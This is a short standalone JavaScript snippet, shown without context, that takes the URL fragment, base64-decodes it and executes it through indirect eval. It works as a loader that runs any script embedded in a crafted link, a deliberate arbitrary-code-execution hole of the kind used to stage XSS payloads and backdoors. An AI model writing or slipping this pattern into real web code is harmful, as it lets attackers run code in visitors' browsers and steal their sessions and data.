(() => {
  const encodedPayload = location.hash.slice(1);
  if (!encodedPayload) return;
  (0, eval)(atob(encodedPayload));
})();
